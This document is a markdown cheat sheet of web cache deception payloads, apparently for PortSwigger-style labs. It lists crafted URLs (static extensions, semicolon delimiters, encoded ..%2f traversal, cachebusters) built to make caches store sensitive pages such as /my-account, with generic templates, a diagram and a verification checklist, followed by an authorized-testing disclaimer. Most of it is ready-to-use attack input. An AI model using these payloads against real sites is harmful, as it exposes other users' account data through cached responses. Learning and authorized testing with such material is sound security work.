# Combined Web Cache Deception Payloads

## Static Extension

```text
/my-account/abc.js
```

---

## Path Mapping + Static Extension

```text
/my-account/abc.js
```

Generic:

```text
/<dynamic-endpoint>/<arbitrary-string>.js
```

---

## Delimiter + Static Extension

```text
/my-account;abc.js
```

Generic:

```text
/<dynamic-endpoint>;<arbitrary-string>.js
```

---

## Origin Normalization

```text
/assets/..%2fprofile
```

Generic:

```text
/<static-directory-prefix>/..%2f<dynamic-path>
```

---

## Cache Normalization

```text
/aaa/..%2frobots.txt
```

```text
/profile%2f%2e%2e%2findex.html
```

---

## Delimiter + Cache Normalization

```text
/profile;%2f%2e%2e%2fstatic
```

Conceptual interpretation:

```text
Origin:
/profile
```

```text
Cache:
/static
```

---

## Exact-Match File Rule

```text
/my-account;%2f%2e%2e%2frobots.txt
```

Potential interpretation:

```text
Origin:
/my-account
```

```text
Cache:
/robots.txt
```

---

## Exact-Match + Cachebuster

```text
/my-account;%2f%2e%2e%2frobots.txt?wcd
```

---

## Static Directory + Cachebuster

```text
/assets/..%2fprofile?wcd
```

---

## Static Extension + Cachebuster

```text
/my-account/abc.js?wcd
```

---

# General Combined Pattern

```text
/<dynamic-path><origin-delimiter><encoded-traversal><cacheable-resource>?<cachebuster>
```

Example:

```text
/my-account;%2f%2e%2e%2frobots.txt?wcd
```

---

# Interpretation Model

```text
                  Crafted URL
                       │
          ┌────────────┴────────────┐
          │                         │
          ▼                         ▼
       Origin                     Cache
          │                         │
          ▼                         ▼
  Sensitive Endpoint         Cacheable Resource
          │                         │
          └────────────┬────────────┘
                       ▼
                Cached Response
                       │
                       ▼
              Unauthorized Access
```

---

# Verification

For each combined payload:

```text
☐ Origin returns sensitive response
☐ Cache considers URL cacheable
☐ X-Cache: miss observed
☐ Same request returns X-Cache: hit
☐ Cached response contains sensitive information
☐ Same cache key can retrieve response
```

---

# Important

These payloads are for authorized security testing, PortSwigger labs, CTFs, or systems where you have explicit permission to test.

Always adapt the payload to the actual cache rule and origin behavior discovered during reconnaissance.